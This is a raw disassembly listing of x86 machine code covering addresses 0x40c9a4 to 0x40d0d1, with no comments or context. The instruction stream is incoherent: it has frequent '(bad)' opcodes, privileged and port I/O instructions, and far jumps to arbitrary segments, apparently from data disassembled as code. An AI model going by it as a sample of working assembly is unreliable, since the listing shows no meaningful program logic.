  40c9a4:	jge    0x40c966
  40c9a6:	jmp    0x40c93f
  40c9a8:	and    BYTE PTR [edx+ebx*8-0x2b],bl
  40c9ac:	inc    ebp
  40c9ad:	or     eax,0x8ade9234
  40c9b2:	push   esp
  40c9b3:	mov    ds:0x4421adef,al
  40c9b8:	int    0x55
  40c9ba:	mov    edi,0xb0bac74b
  40c9bf:	mov    al,0x4b
  40c9c1:	ret    0x29a3
  40c9c4:	scas   al,BYTE PTR es:[edi]
  40c9c5:	fldenv [ebx]
  40c9c7:	dec    ebx
  40c9c8:	(bad)  
  40c9ca:	dec    eax
  40c9cb:	ret    
  40c9cc:	and    BYTE PTR [edx],0x54
  40c9cf:	bound  ecx,QWORD PTR gs:0x29e457cf
  40c9d6:	xor    BYTE PTR [ebp+0x7c247e74],0x49
  40c9dd:	dec    edi
  40c9de:	lds    ebx,FWORD PTR [ecx+0x10]
  40c9e1:	aaa    
  40c9e2:	cmp    edx,DWORD PTR [ebx-0x480212ee]
  40c9e8:	aaa    
  40c9e9:	jb     0x40ca1b
  40c9eb:	adc    DWORD PTR [esp+edi*4-0x35422e9c],ecx
  40c9f2:	sbb    ebx,DWORD PTR [esi+ebx*4]
  40c9f5:	int3   
  40c9f6:	in     al,0x2c
  40c9f8:	xchg   ecx,edi
  40c9fa:	int    0xd8
  40c9fc:	scas   eax,DWORD PTR es:[edi]
  40c9fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9fe:	pop    ds
  40c9ff:	and    BYTE PTR [esi],bl
  40ca01:	into   
  40ca02:	lods   al,BYTE PTR ds:[esi]
  40ca03:	xchg   esp,eax
  40ca04:	inc    ebp
  40ca05:	pop    edx
  40ca06:	out    0xc1,al
  40ca08:	push   ecx
  40ca09:	jo     0x40ca4b
  40ca0b:	test   DWORD PTR [esi*4-0x758bafc0],eax
  40ca12:	jle    0x40c9b5
  40ca14:	pop    esi
  40ca15:	jne    0x40c9ca
  40ca17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca18:	jmp    0x6fa8:0xa50a2c7a
  40ca1f:	fstp   QWORD PTR [ebx-0x69c24af8]
  40ca25:	xchg   ebp,eax
  40ca26:	je     0x40ca31
  40ca28:	xchg   DWORD PTR [esi+ecx*1+0xb7d71a7],eax
  40ca2f:	rsm    
  40ca31:	inc    esp
  40ca32:	push   ds
  40ca33:	iret   
  40ca34:	out    dx,eax
  40ca35:	adc    esp,esi
  40ca37:	fsubr  QWORD PTR ds:[ebx-0x10f833d0]
  40ca3e:	or     BYTE PTR [esi-0x56],cl
  40ca41:	fistp  WORD PTR [ebx-0x27]
  40ca44:	jmp    0x8cc436a7
  40ca49:	(bad)  
  40ca4b:	cli    
  40ca4c:	or     edi,esi
  40ca4e:	into   
  40ca4f:	xor    eax,0xddca7bd7
  40ca54:	(bad)  
  40ca55:	mov    eax,0xa04aaa2e
  40ca5a:	bswap  ebx
  40ca5c:	add    cl,BYTE PTR [esi]
  40ca5e:	mov    dh,0xf4
  40ca60:	sub    BYTE PTR [eax+edx*8],ch
  40ca63:	jnp    0x40ca81
  40ca65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca66:	xlat   BYTE PTR ds:[ebx]
  40ca67:	outs   dx,DWORD PTR ds:[esi]
  40ca68:	inc    ecx
  40ca69:	sub    BYTE PTR [edx+0x20],bh
  40ca6c:	fcom   DWORD PTR [edi]
  40ca6e:	lea    edx,[esi]
  40ca70:	(bad)  
  40ca71:	std    
  40ca72:	mov    al,0x25
  40ca74:	add    ebp,DWORD PTR ds:0xe35a7760
  40ca7a:	test   DWORD PTR [ecx-0x6],ebx
  40ca7d:	addr16 sbb ch,cl
  40ca80:	lea    ebp,[edi]
  40ca82:	pop    edx
  40ca83:	(bad)  
  40ca84:	pushf  
  40ca85:	outs   dx,BYTE PTR ds:[esi]
  40ca86:	mov    al,ds:0xb1013186
  40ca8b:	sub    al,0x87
  40ca8d:	sub    eax,0x41813372
  40ca92:	imul   edi,DWORD PTR [edx-0x62],0xfffffff3
  40ca96:	mov    eax,0xd3373540
  40ca9b:	dec    edx
  40ca9c:	je     0x40ca4d
  40ca9e:	repnz inc ecx
  40caa0:	enter  0x3a5f,0x24
  40caa4:	jb     0x40ca5d
  40caa6:	sub    eax,0x74690842
  40caab:	cmp    esp,edi
  40caad:	xor    DWORD PTR [ecx-0x27f04d56],ebp
  40cab3:	mov    edx,0xf61950dd
  40cab8:	inc    esi
  40cab9:	cmp    BYTE PTR [eax+eax*2+0x7],0x87
  40cabe:	and    dl,BYTE PTR [esi+0x10]
  40cac1:	icebp  
  40cac2:	pop    ss
  40cac3:	xchg   esp,eax
  40cac4:	jle    0x40cb0f
  40cac6:	arpl   WORD PTR [ebx],bx
  40cac8:	jl     0x40cab6
  40caca:	out    0x1,eax
  40cacc:	hlt    
  40cacd:	mov    ebx,0x72b066e9
  40cad2:	xchg   esp,eax
  40cad3:	push   ds
  40cad4:	or     al,0xa8
  40cad6:	fsub   QWORD PTR [esi-0x1c4e09e6]
  40cadc:	pop    ebp
  40cadd:	jp     0x40cb00
  40cadf:	lock or eax,0x15150e93
  40cae5:	das    
  40cae6:	jge    0x40ca98
  40cae8:	out    0xb6,al
  40caea:	mov    ebp,0x62ad9a52
  40caef:	jecxz  0x40caa2
  40caf1:	adc    BYTE PTR [ebx+0x33],cl
  40caf4:	adc    edx,DWORD PTR fs:[esp+edi*1]
  40caf8:	fild   DWORD PTR [eax]
  40cafa:	repz or al,0x57
  40cafd:	test   BYTE PTR [ecx],dh
  40caff:	add    bh,0x57
  40cb02:	mov    bl,0x9e
  40cb04:	mov    ds:0x9d571154,eax
  40cb09:	add    esp,DWORD PTR [esi]
  40cb0b:	xor    eax,0xcd5e4a03
  40cb10:	cs mov ecx,0x8a118079
  40cb16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb17:	popa   
  40cb18:	xor    al,0xe
  40cb1a:	int3   
  40cb1b:	sahf   
  40cb1c:	dec    eax
  40cb1d:	into   
  40cb1e:	ins    BYTE PTR es:[edi],dx
  40cb1f:	adc    DWORD PTR [edi],0xc06b2680
  40cb25:	add    al,0x19
  40cb27:	pop    edx
  40cb28:	test   BYTE PTR [esi-0x5],al
  40cb2b:	scas   al,BYTE PTR es:[edi]
  40cb2c:	xchg   esp,eax
  40cb2d:	int    0x25
  40cb2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb30:	pop    eax
  40cb31:	mov    al,BYTE PTR [ebx]
  40cb33:	popa   
  40cb34:	js     0x40cacb
  40cb36:	iret   
  40cb37:	jge    0x40cb56
  40cb39:	inc    ecx
  40cb3a:	mov    dh,0x9c
  40cb3c:	pop    es
  40cb3d:	fbld   TBYTE PTR [esi+esi*8-0x25]
  40cb41:	mov    dl,BYTE PTR [ecx]
  40cb43:	icebp  
  40cb44:	icebp  
  40cb45:	sub    al,0xae
  40cb47:	and    DWORD PTR [eax],ecx
  40cb49:	jge    0x40cb29
  40cb4b:	mov    ebp,0xbbb98fea
  40cb51:	push   es
  40cb52:	fist   WORD PTR [edi+0x71a84ff5]
  40cb58:	jnp    0x40cb50
  40cb5a:	mov    edi,0xbc67b1e1
  40cb5f:	les    esi,FWORD PTR [eax]
  40cb61:	(bad)  
  40cb62:	mov    ah,0xe8
  40cb64:	rcl    BYTE PTR [edi],cl
  40cb66:	lock mov esp,DWORD PTR [ecx]
  40cb69:	in     al,dx
  40cb6a:	mov    DWORD PTR [eax+0xf6cc1e0],edi
  40cb70:	hlt    
  40cb71:	mov    edx,0x540216d
  40cb76:	jle    0x40cbe2
  40cb78:	cmp    esp,DWORD PTR [edi-0x67]
  40cb7b:	mov    bh,0x66
  40cb7d:	push   ebp
  40cb7e:	mov    dl,0xdf
  40cb80:	dec    eax
  40cb81:	dec    ebx
  40cb82:	inc    ebp
  40cb83:	sbb    al,0xae
  40cb85:	std    
  40cb86:	add    DWORD PTR [ebx],esp
  40cb88:	pop    ds
  40cb89:	jns    0x40cbd1
  40cb8b:	int    0x2a
  40cb8d:	and    edx,esp
  40cb8f:	loope  0x40cbce
  40cb91:	add    BYTE PTR [ebx+0x65],dl
  40cb94:	retf   
  40cb95:	mov    ah,0x63
  40cb97:	out    0xf9,al
  40cb99:	(bad)  
  40cb9a:	cld    
  40cb9b:	cmc    
  40cb9c:	xor    DWORD PTR ds:0xb00018a1,esp
  40cba2:	imul   ebp,DWORD PTR [esi-0x4641f8a3],0xed3326f5
  40cbac:	push   0x48
  40cbae:	jg     0x40cb3d
  40cbb0:	mov    ss,WORD PTR [ebp+0x18]
  40cbb3:	pop    esi
  40cbb4:	adc    eax,0x464dcc6b
  40cbb9:	imul   ecx,DWORD PTR [ecx-0x5e],0x2ef55760
  40cbc0:	jmp    0x40cbfb
  40cbc2:	ja     0x40cb52
  40cbc4:	mov    dh,0x41
  40cbc6:	push   0xffffff97
  40cbc8:	push   cs
  40cbc9:	cld    
  40cbca:	push   edi
  40cbcb:	repz es call 0xa005edfa
  40cbd2:	or     edx,DWORD PTR [edx]
  40cbd4:	and    al,0x5d
  40cbd6:	js     0x40cb6b
  40cbd8:	cs mov ah,0x1d
  40cbdb:	ins    BYTE PTR es:[edi],dx
  40cbdc:	dec    edi
  40cbdd:	es push 0x3b
  40cbe0:	stc    
  40cbe1:	icebp  
  40cbe2:	push   0x2f
  40cbe4:	jg     0x40cc4b
  40cbe6:	dec    ebx
  40cbe7:	retf   0x6b70
  40cbea:	lods   al,BYTE PTR ds:[esi]
  40cbeb:	shl    DWORD PTR [eax+0x27],1
  40cbee:	push   ds
  40cbef:	xchg   edi,eax
  40cbf0:	into   
  40cbf1:	jl     0x40cb88
  40cbf3:	aad    0x65
  40cbf5:	pop    eax
  40cbf6:	aaa    
  40cbf7:	xchg   ebp,eax
  40cbf8:	mov    edi,0x5611b66a
  40cbfd:	je     0x40cbd3
  40cbff:	adc    al,0xa2
  40cc01:	pop    ss
  40cc02:	mov    edx,fs
  40cc04:	test   DWORD PTR [edi+0x3492502e],edx
  40cc0a:	push   esp
  40cc0b:	iret   
  40cc0c:	sub    DWORD PTR [ebp-0x2ef80034],edx
  40cc12:	mov    eax,ds:0x35d6247c
  40cc17:	push   ss
  40cc18:	in     eax,0x9a
  40cc1a:	xchg   edx,eax
  40cc1b:	mov    ebx,0xad382d09
  40cc20:	pop    edx
  40cc21:	push   0x28d90d60
  40cc26:	jbe    0x40cc1b
  40cc28:	shr    ah,1
  40cc2a:	out    dx,eax
  40cc2b:	adc    al,0x6e
  40cc2d:	clc    
  40cc2e:	inc    ecx
  40cc2f:	into   
  40cc30:	mov    dl,0x10
  40cc32:	lods   al,BYTE PTR ds:[esi]
  40cc33:	mov    al,0x9e
  40cc35:	ret    0x80ef
  40cc38:	sar    bl,cl
  40cc3a:	shr    edx,cl
  40cc3c:	scas   eax,DWORD PTR es:[edi]
  40cc3d:	arpl   WORD PTR [esi+0x9],bp
  40cc40:	inc    ebx
  40cc41:	fcom   QWORD PTR [esi]
  40cc43:	pmulhuw mm7,QWORD PTR [edx]
  40cc46:	ret    
  40cc47:	jno    0x40cc75
  40cc49:	mov    DWORD PTR [edi+0x50],edi
  40cc4c:	xor    edi,0x1b
  40cc4f:	test   BYTE PTR [ebx+0x41],ch
  40cc52:	sbb    ebp,DWORD PTR [edi-0x3fc8c3ef]
  40cc58:	pop    es
  40cc59:	or     ecx,DWORD PTR [eax-0x27]
  40cc5c:	aam    0x49
  40cc5e:	test   eax,0x507d3c32
  40cc63:	je     0x40cc0d
  40cc65:	fs dec edx
  40cc67:	inc    ebp
  40cc69:	pop    edx
  40cc6a:	(bad)  [edi]
  40cc6c:	push   ss
  40cc6d:	aaa    
  40cc6e:	add    eax,DWORD PTR [esi+0x29]
  40cc71:	pop    edx
  40cc72:	sar    BYTE PTR [edi+0x7e],1
  40cc75:	and    ch,BYTE PTR [ebx+eax*2-0x2f]
  40cc79:	jecxz  0x40cc00
  40cc7b:	push   0x22
  40cc7d:	in     eax,0x12
  40cc7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc80:	fistp  QWORD PTR [edx+0xd]
  40cc83:	bt     DWORD PTR ds:[edx+0x5b],edx
  40cc88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc89:	xchg   ebp,eax
  40cc8a:	rol    DWORD PTR [ebx-0x629ca258],cl
  40cc90:	test   ebx,esp
  40cc92:	jns    0x40cd06
  40cc94:	loopne 0x40cc24
  40cc96:	ja     0x40ccbe
  40cc98:	mov    cl,0x1e
  40cc9a:	je     0x40cc69
  40cc9c:	or     DWORD PTR [edi],eax
  40cc9e:	or     BYTE PTR [edx],0x9e
  40cca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cca2:	jge    0x40cce2
  40cca4:	lds    ebp,FWORD PTR [edx+0x77]
  40cca7:	jmp    0xf392:0x99f165ee
  40ccae:	cmp    BYTE PTR [edx-0xe],ah
  40ccb1:	(bad)  
  40ccb2:	cwde   
  40ccb3:	dec    ebx
  40ccb4:	cmp    dl,BYTE PTR [ecx-0x7a8524]
  40ccba:	push   esi
  40ccbb:	icebp  
  40ccbc:	inc    edi
  40ccbd:	mov    edi,0x91fa8a9a
  40ccc2:	add    DWORD PTR [ebx],edx
  40ccc4:	mov    ebp,0x26444f99
  40ccc9:	sahf   
  40ccca:	mov    ebx,0x6a0ea4dd
  40cccf:	or     esp,DWORD PTR [edi+eiz*8]
  40ccd2:	mov    dl,0x6f
  40ccd4:	in     eax,0x82
  40ccd6:	sbb    esi,DWORD PTR [ecx-0x53]
  40ccd9:	in     al,dx
  40ccda:	dec    edx
  40ccdb:	push   esp
  40ccdc:	pop    edx
  40ccdd:	xor    eax,DWORD PTR [ebp-0x57fce638]
  40cce3:	(bad)  
  40cce5:	dec    esp
  40cce6:	fist   WORD PTR [eax]
  40cce8:	arpl   WORD PTR [edx+0xa],bp
  40cceb:	es sahf 
  40cced:	and    BYTE PTR [edx-0x76dba28c],0xa6
  40ccf4:	(bad)  
  40ccf5:	sub    al,0xa4
  40ccf7:	out    0xcf,al
  40ccf9:	cmp    edx,esp
  40ccfb:	pop    DWORD PTR [eax]
  40ccfd:	retf   0x206a
  40cd00:	and    ebx,esi
  40cd02:	ja     0x40cc9c
  40cd04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd05:	cmp    bh,cl
  40cd07:	in     eax,dx
  40cd08:	jmp    DWORD PTR [esi+0x10]
  40cd0b:	xchg   BYTE PTR [edi+edx*1+0x1086dda4],bh
  40cd12:	(bad)  
  40cd13:	adc    bh,BYTE PTR [ecx-0x9]
  40cd16:	inc    edi
  40cd17:	push   ss
  40cd18:	xchg   edx,eax
  40cd19:	int3   
  40cd1a:	jbe    0x40ccb8
  40cd1c:	cmp    DWORD PTR [edi+ecx*4+0x4a],esp
  40cd20:	in     al,dx
  40cd21:	mov    ch,0x9a
  40cd23:	adc    al,0x9
  40cd25:	arpl   di,bx
  40cd27:	mov    DWORD PTR [ebp-0x66],ecx
  40cd2a:	in     eax,0x2c
  40cd2c:	mov    ds:0x51ea4699,eax
  40cd31:	bound  ecx,QWORD PTR [edi+ecx*4]
  40cd34:	mov    BYTE PTR [edx],bl
  40cd36:	xchg   edi,eax
  40cd37:	repnz xchg edx,eax
  40cd39:	retf   0xcfd1
  40cd3c:	test   eax,0xfea0911e
  40cd41:	xor    DWORD PTR [eax-0x1e],esi
  40cd44:	jge    0x40cd4e
  40cd46:	mov    al,ds:0x741845a3
  40cd4b:	mov    bh,0x41
  40cd4d:	jmp    0x10753cd6
  40cd52:	mov    dh,0xdf
  40cd54:	lods   eax,DWORD PTR ds:[esi]
  40cd55:	test   BYTE PTR [ebx],al
  40cd57:	xor    DWORD PTR [edi],eax
  40cd59:	jle    0x40ccea
  40cd5b:	scas   al,BYTE PTR es:[edi]
  40cd5c:	adc    BYTE PTR [ebx+esi*8+0x2d],cl
  40cd60:	out    dx,al
  40cd61:	mov    ecx,0x8d0d657d
  40cd66:	rol    DWORD PTR [esp+eiz*8+0x31],cl
  40cd6a:	fmul   QWORD PTR [ecx-0x46]
  40cd6d:	add    DWORD PTR [ecx],eax
  40cd6f:	aad    0x7c
  40cd71:	mov    ecx,0x77ab0071
  40cd76:	scas   al,BYTE PTR es:[edi]
  40cd77:	jno    0x40cd47
  40cd79:	xchg   edx,eax
  40cd7a:	cwde   
  40cd7b:	pop    ecx
  40cd7c:	xchg   esi,eax
  40cd7d:	push   ebp
  40cd7e:	xor    DWORD PTR [ebp+0x15],0x3646afc5
  40cd85:	adc    ebp,DWORD PTR [edi]
  40cd87:	cmp    ecx,DWORD PTR [eax+0x64]
  40cd8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd8b:	iret   
  40cd8c:	arpl   WORD PTR [ecx-0x16],ax
  40cd8f:	adc    eax,0x86ca281a
  40cd94:	stc    
  40cd95:	test   BYTE PTR ds:0xffea83ae,ch
  40cd9b:	pop    esi
  40cd9c:	jb     0x40cd1e
  40cd9e:	and    DWORD PTR [ecx+0x46],ebp
  40cda1:	inc    eax
  40cda2:	cli    
  40cda3:	lods   al,BYTE PTR ds:[esi]
  40cda4:	pop    esp
  40cda5:	dec    esi
  40cda6:	(bad)  
  40cda7:	jg     0x40cdee
  40cda9:	jmp    DWORD PTR ds:0xc3b5a5d0
  40cdaf:	push   es
  40cdb0:	jge    0x40cd91
  40cdb2:	adc    eax,DWORD PTR [edi]
  40cdb4:	outs   dx,DWORD PTR ds:[esi]
  40cdb5:	cmp    edx,esp
  40cdb7:	pop    eax
  40cdb8:	pop    esp
  40cdb9:	out    0xc7,al
  40cdbb:	sbb    eax,0x24090a42
  40cdc0:	sar    DWORD PTR [edi+0x38],1
  40cdc3:	jecxz  0x40ce2a
  40cdc5:	ins    BYTE PTR es:[edi],dx
  40cdc6:	or     bh,cl
  40cdc8:	enter  0xe1d1,0x54
  40cdcc:	mov    cs,WORD PTR [ebx-0x3]
  40cdcf:	call   0xd066cb04
  40cdd4:	in     eax,0x2c
  40cdd6:	icebp  
  40cdd7:	jbe    0x40cddc
  40cdd9:	pop    esi
  40cdda:	xchg   DWORD PTR ds:0x6e3cad59,edx
  40cde0:	out    dx,eax
  40cde1:	mov    ds:0x868ff8e0,al
  40cde6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cde7:	add    DWORD PTR [ecx],esp
  40cde9:	cld    
  40cdea:	cwde   
  40cdeb:	stc    
  40cdec:	int3   
  40cded:	mov    edi,0xcc44406
  40cdf2:	cmp    al,0x0
  40cdf4:	jp     0x40ce5e
  40cdf6:	inc    edx
  40cdf7:	sub    ah,BYTE PTR [ecx]
  40cdf9:	mov    ebx,0x83283579
  40cdfe:	mov    ebx,0x56c7d92b
  40ce03:	rcr    BYTE PTR [edx+0x6a0ba96c],1
  40ce09:	adc    esp,edx
  40ce0b:	cmp    DWORD PTR [edx-0x4d61e463],edx
  40ce11:	inc    edx
  40ce12:	cmp    eax,0xda5c9a28
  40ce17:	repnz fs dec eax
  40ce1a:	xor    ah,BYTE PTR [esp+eiz*4-0x32dde07]
  40ce21:	in     al,0xb6
  40ce23:	dec    ebp
  40ce24:	mov    dh,0x18
  40ce26:	ins    DWORD PTR es:[edi],dx
  40ce27:	pop    ds
  40ce28:	(bad)
  40ce2c:	add    DWORD PTR [ecx],0xba2ea070
  40ce32:	fwait
  40ce33:	sar    BYTE PTR fs:[edi+0x15],0x65
  40ce38:	std    
  40ce39:	sbb    dh,bh
  40ce3b:	push   eax
  40ce3c:	pop    esi
  40ce3d:	test   BYTE PTR [edi],al
  40ce3f:	adc    BYTE PTR [edi-0x6d],cl
  40ce42:	inc    ecx
  40ce43:	jmp    0xfa83:0x3a99a09b
  40ce4a:	push   edi
  40ce4b:	and    eax,0x3e735544
  40ce50:	mov    bl,0x91
  40ce52:	imul   ebp,DWORD PTR [ebp+0x6f],0xd9293b0d
  40ce59:	dec    edi
  40ce5a:	xchg   esi,eax
  40ce5b:	fiadd  DWORD PTR [ebx]
  40ce5d:	push   ds
  40ce5e:	cmp    al,0x1a
  40ce60:	popf   
  40ce61:	cmp    eax,0xbb0c55cb
  40ce66:	pop    ebx
  40ce67:	fmul   st,st(0)
  40ce69:	das    
  40ce6a:	das    
  40ce6b:	ins    BYTE PTR es:[edi],dx
  40ce6c:	ret    0x4525
  40ce6f:	push   esp
  40ce70:	pushf  
  40ce71:	es cwde 
  40ce73:	std    
  40ce74:	mov    ebp,0xf5346707
  40ce79:	xor    BYTE PTR ds:0x51313e2e,ah
  40ce7f:	mov    cl,0xc5
  40ce81:	cmp    BYTE PTR [ecx-0x1edfd2ba],cl
  40ce87:	(bad)  
  40ce88:	lock je 0x40ce95
  40ce8b:	call   0xf397eff5
  40ce90:	pop    esi
  40ce91:	sbb    bh,ch
  40ce93:	int3   
  40ce94:	sbb    al,0x60
  40ce96:	lds    ebx,FWORD PTR [ebx+0x25]
  40ce99:	iret   
  40ce9a:	enter  0x9bbc,0x1
  40ce9e:	or     DWORD PTR [ecx],esi
  40cea0:	sbb    dh,BYTE PTR [eax-0x512d911e]
  40cea6:	sub    al,bl
  40cea8:	sbb    esp,DWORD PTR [eax]
  40ceaa:	push   ecx
  40ceab:	dec    edi
  40ceac:	int    0x46
  40ceae:	aaa    
  40ceaf:	push   ebp
  40ceb0:	test   BYTE PTR [ebp+0x32d268cf],ch
  40ceb6:	and    eax,0xf38dda59
  40cebb:	out    dx,eax
  40cebc:	lods   eax,DWORD PTR ds:[esi]
  40cebd:	and    al,BYTE PTR [ecx-0x3]
  40cec0:	pop    esp
  40cec1:	aaa    
  40cec2:	jg     0x40ceb0
  40cec4:	mov    ds:0xb44279a9,al
  40cec9:	call   0xbaad:0xdf9313be
  40ced0:	jnp    0x40ce6c
  40ced2:	imul   ecx,ebp,0x4
  40ced5:	arpl   di,cx
  40ced7:	cmp    BYTE PTR [edi-0x57],0xcc
  40cedb:	push   ss
  40cedc:	(bad)  
  40cedd:	in     eax,0x7b
  40cedf:	add    DWORD PTR [eax-0x144aa386],edi
  40cee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cee6:	jnp    0x40ce6c
  40cee8:	add    DWORD PTR [ecx-0x45073d3d],esi
  40ceee:	pop    ebp
  40ceef:	out    dx,eax
  40cef0:	push   0x54
  40cef2:	adc    bh,BYTE PTR [esp+eax*8-0xa48fdef]
  40cef9:	and    BYTE PTR [esi-0x21],0x8c
  40cefd:	clc    
  40cefe:	jecxz  0x40cf4f
  40cf00:	jne    0x40ce92
  40cf02:	mov    BYTE PTR [edi],cl
  40cf04:	addr16 dec ecx
  40cf06:	data16 int3 
  40cf08:	mov    ch,0x10
  40cf0a:	test   BYTE PTR [esi+0x4],al
  40cf0d:	mov    BYTE PTR ds:0x330b9077,bh
  40cf13:	add    esi,DWORD PTR [eax-0x8]
  40cf16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf17:	popf   
  40cf18:	stos   BYTE PTR es:[edi],al
  40cf19:	lahf   
  40cf1a:	pusha  
  40cf1b:	and    edi,0x9c391a
  40cf21:	jae    0x40cec7
  40cf23:	jecxz  0x40cf75
  40cf25:	xchg   cl,ah
  40cf27:	dec    bx
  40cf29:	sahf   
  40cf2a:	aam    0xa6
  40cf2c:	push   ds
  40cf2d:	repnz std 
  40cf2f:	add    eax,DWORD PTR [edi+0x25387832]
  40cf35:	jl     0x40cee3
  40cf37:	pusha  
  40cf38:	and    al,0xf0
  40cf3a:	adc    eax,0xe57f6fad
  40cf3f:	mov    eax,0x79a3279d
  40cf44:	jnp    0x40cefa
  40cf46:	mov    WORD PTR [edi],es
  40cf48:	ins    BYTE PTR es:[edi],dx
  40cf49:	lock addr16 jp 0x40cf1e
  40cf4d:	dec    edx
  40cf4e:	xchg   ebp,eax
  40cf4f:	in     al,0x70
  40cf51:	ret    0xcf23
  40cf54:	cs jb  0x40cfb9
  40cf57:	lods   al,BYTE PTR ds:[esi]
  40cf58:	sub    DWORD PTR [edx+edx*4],0x57
  40cf5c:	cmc    
  40cf5d:	ror    BYTE PTR [ebp+eiz*1-0x5f],1
  40cf61:	mov    bh,0x72
  40cf63:	gs xchg bx,ax
  40cf66:	mov    eax,0x25d89236
  40cf6b:	call   0xc1b1:0x2e35e0bc
  40cf72:	sahf   
  40cf73:	(bad)  
  40cf75:	mov    ch,0xe2
  40cf77:	or     BYTE PTR [ebp-0x67],bh
  40cf7a:	(bad)  
  40cf7b:	or     eax,0x94598b1e
  40cf80:	mov    esi,DWORD PTR [edi-0x1374020c]
  40cf86:	push   cs
  40cf87:	xchg   edi,eax
  40cf88:	sbb    eax,0xf3da981
  40cf8d:	add    BYTE PTR [ecx-0x79e4351b],0x5
  40cf94:	add    DWORD PTR [esi],eax
  40cf96:	lds    eax,FWORD PTR [ebx+0x1f]
  40cf99:	jno    0x40cfc2
  40cf9b:	test   DWORD PTR [ecx+0x2888aa04],edi
  40cfa1:	les    eax,FWORD PTR [ebp+0x63]
  40cfa4:	cmp    al,0x2d
  40cfa6:	dec    esp
  40cfa7:	fucomip st,st(4)
  40cfa9:	(bad)  
  40cfaa:	fcos   
  40cfac:	add    eax,esi
  40cfae:	pop    edx
  40cfaf:	ret    0xeb15
  40cfb2:	in     eax,0x2e
  40cfb4:	fnstenv [edx-0x561365c7]
  40cfba:	scas   eax,DWORD PTR es:[edi]
  40cfbb:	cmp    eax,0x90aa05a9
  40cfc0:	cmp    DWORD PTR [ecx],edi
  40cfc2:	imul   ebp,DWORD PTR [eax],0xe8295fc5
  40cfc8:	mov    DWORD PTR [ecx-0x1738d85b],edi
  40cfce:	jmp    0xbb3c:0xe368f04a
  40cfd5:	pop    ds
  40cfd6:	leave  
  40cfd7:	retf   0x9837
  40cfda:	ins    BYTE PTR es:[edi],dx
  40cfdb:	dec    edi
  40cfdc:	mov    eax,ds:0xd98cc7ad
  40cfe1:	xchg   edi,eax
  40cfe2:	sbb    al,0xa5
  40cfe4:	retf   
  40cfe5:	mov    BYTE PTR ds:0x7451f2e4,al
  40cfeb:	push   cs
  40cfec:	mov    esi,0x66aa04d5
  40cff1:	les    ebx,FWORD PTR [eax+edi*4-0x69]
  40cff5:	rol    BYTE PTR [ebx-0x62],0xd5
  40cff9:	cmp    al,0xc5
  40cffb:	jg     0x40d017
  40cffd:	sbb    bh,dh
  40cfff:	iret   
  40d000:	rol    al,0x4f
  40d003:	and    esi,edi
  40d005:	dec    eax
  40d006:	shr    bl,0x4
  40d009:	inc    edx
  40d00a:	adc    ebp,DWORD PTR [edi+esi*2-0x1b7d7d8]
  40d011:	mov    dh,0x4b
  40d013:	mov    al,ds:0x4113173
  40d018:	repz push 0x429cef47
  40d01e:	retf   0xf870
  40d021:	out    0x35,al
  40d023:	iret   
  40d024:	cmp    ch,BYTE PTR [esi-0x591f1989]
  40d02a:	out    0x3,eax
  40d02c:	in     al,dx
  40d02d:	aas    
  40d02e:	pop    edi
  40d02f:	xchg   ecx,eax
  40d030:	mov    dh,0xf3
  40d032:	inc    edx
  40d033:	or     BYTE PTR [ebx],0x78
  40d036:	push   edx
  40d037:	jmp    0x1533:0x62c4511e
  40d03e:	sub    ecx,DWORD PTR [edi]
  40d040:	loopne 0x40d06f
  40d042:	and    DWORD PTR [ebx-0x78],0xfffffffe
  40d046:	mov    WORD PTR [edi+0x67],ds
  40d049:	lods   al,BYTE PTR ds:[esi]
  40d04a:	retf   0x3e91
  40d04d:	scas   eax,DWORD PTR es:[edi]
  40d04e:	ficom  WORD PTR [ecx-0x79]
  40d051:	xor    eax,0x64f7ae1b
  40d056:	push   DWORD PTR [ecx+0x8]
  40d059:	or     cl,BYTE PTR [edx+0x272a4dd2]
  40d05f:	cli    
  40d060:	les    eax,FWORD PTR [edi+0x49]
  40d063:	popa   
  40d064:	xor    BYTE PTR [ebp+edi*8-0x38],dh
  40d068:	pop    edi
  40d069:	daa    
  40d06a:	in     eax,0x54
  40d06c:	push   cs
  40d06d:	jnp    0x40cff5
  40d06f:	sub    DWORD PTR [edi+edx*2-0x4a],0x71
  40d074:	fwait
  40d075:	retf   
  40d076:	push   ebp
  40d077:	mov    esp,0xa33a941
  40d07c:	ins    BYTE PTR es:[edi],dx
  40d07d:	and    al,0xa4
  40d07f:	call   FWORD PTR [edi+0x4714f3aa]
  40d085:	push   0x82d3d60
  40d08a:	out    dx,al
  40d08b:	push   edx
  40d08c:	or     esp,DWORD PTR [edx]
  40d08e:	stc    
  40d08f:	sbb    eax,0xa0fca702
  40d094:	or     eax,0x8f450e06
  40d099:	jne    0x40d0b6
  40d09b:	jns    0x40d022
  40d09d:	ins    DWORD PTR es:[edi],dx
  40d09e:	mov    WORD PTR [edi],?
  40d0a0:	jo     0x40d09a
  40d0a2:	sbb    DWORD PTR [ebx-0x79],edi
  40d0a5:	xchg   esp,eax
  40d0a6:	ins    BYTE PTR es:[edi],dx
  40d0a7:	mov    ch,0x97
  40d0a9:	sbb    BYTE PTR [edi],dl
  40d0ab:	inc    esp
  40d0ac:	sub    al,0xf0
  40d0ae:	xor    ebx,ecx
  40d0b0:	adc    ah,BYTE PTR [edi-0xb]
  40d0b3:	mov    ds:0x3445d5d6,al
  40d0b8:	adc    DWORD PTR [ecx],edx
  40d0ba:	shl    DWORD PTR [eax-0x26],1
  40d0bd:	sub    DWORD PTR [edx-0x455342d4],ecx
  40d0c3:	and    BYTE PTR [ebp+edx*1-0x64],bl
  40d0c7:	mov    ebx,0x4f560808
  40d0cc:	jg     0x40d14d
  40d0ce:	sbb    al,0x46
  40d0d0:	pop    edx
  40d0d1:	inc    ebx
